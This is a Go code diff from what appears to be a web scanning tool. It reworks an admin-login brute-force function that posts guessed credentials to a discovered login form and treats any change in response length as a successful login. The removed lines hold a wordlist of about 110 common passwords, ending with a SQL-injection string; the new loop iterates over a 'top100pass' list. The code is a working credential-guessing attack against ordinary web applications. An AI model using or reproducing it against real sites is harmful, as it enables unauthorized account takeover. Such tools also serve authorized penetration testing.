@@ -11,11 +11,6 @@ import (
 	"time"
 )
 
-var (
-	usernames = []string{"admin"}
-	passwords = []string{"admin", "test", "admin123", "password", "admin@123", "admin888", "root", "123456", "a123456", "123456a", "5201314", "111111", "woaini1314", "qq123456", "123123", "000000", "1qaz2wsx", "1q2w3e4r", "qwe123", "7758521", "123qwe", "a123123", "123456aa", "woaini520", "woaini", "100200", "1314520", "woaini123", "123321", "q123456", "123456789", "123456789a", "5211314", "asd123", "a123456789", "z123456", "asd123456", "a5201314", "aa123456", "zhang123", "aptx4869", "123123a", "1q2w3e4r5t", "1qazxsw2", "5201314a", "1q2w3e", "aini1314", "31415926", "q1w2e3r4", "123456qq", "woaini521", "1234qwer", "a111111", "520520", "iloveyou", "abc123", "110110", "111111a", "123456abc", "w123456", "7758258", "123qweasd", "159753", "qwer1234", "a000000", "qq123123", "zxc123", "123654", "abc123456", "123456q", "qq5201314", "12345678", "000000a", "456852", "as123456", "1314521", "112233", "521521", "qazwsx123", "zxc123456", "abcd1234", "asdasd", "666666", "love1314", "QAZ123", "aaa123", "q1w2e3", "aaaaaa", "a123321", "123000", "11111111", "12qwaszx", "5845201314", "s123456", "nihao123", "caonima123", "zxcvbnm123", "wang123", "159357", "1A2B3C4D", "asdasd123", "584520", "753951", "147258", "1123581321", "110120", "qq1314520", "'or'='or'"}
-)
-
 func getinput(domainurl string) (usernamekey string, passwordkey string, domainurlx string) {
 	var tr *http.Transport
 	if HttpProxy != "" {
@@ -100,17 +95,13 @@ func Admin_brute(url string) (username string, password string, loginurl string)
 	usernamekey, passwordkey, loginurl := getinput(url)
 	if loginurl != "" {
 		if req, err := httpRequset(loginurl, "POST", fmt.Sprintf("%s=admin&%s=7756ee93d3ac8037bf4d55744b93e08c", usernamekey, passwordkey)); err == nil {
-			wronglength := req.ContentLength
-			for useri := range usernames {
-				for passi := range passwords {
-					if req2, err2 := httpRequset(loginurl, "POST", fmt.Sprintf("%s=%s&%s=%s", usernamekey, usernames[useri], passwordkey, passwords[passi])); err2 == nil {
-						length := req2.ContentLength
-						if length != wronglength {
-							fmt.Println()
-							fmt.Printf("admin-brute-sucess|%s:%s--%s", usernames[useri], passwords[passi], loginurl)
-							fmt.Println()
-							return usernames[useri], passwords[passi], loginurl
-						}
+			for passi := range top100pass {
+				if req2, err2 := httpRequset(loginurl, "POST", fmt.Sprintf("%s=admin&%s=%s", usernamekey, passwordkey, top100pass[passi])); err2 == nil {
+					if req2.ContentLength != req.ContentLength {
+						fmt.Println()
+						fmt.Printf("admin-brute-sucess|admin:%s--%s", top100pass[passi], loginurl)
+						fmt.Println()
+						return "admin", top100pass[passi], loginurl
 					}
 				}
 			}
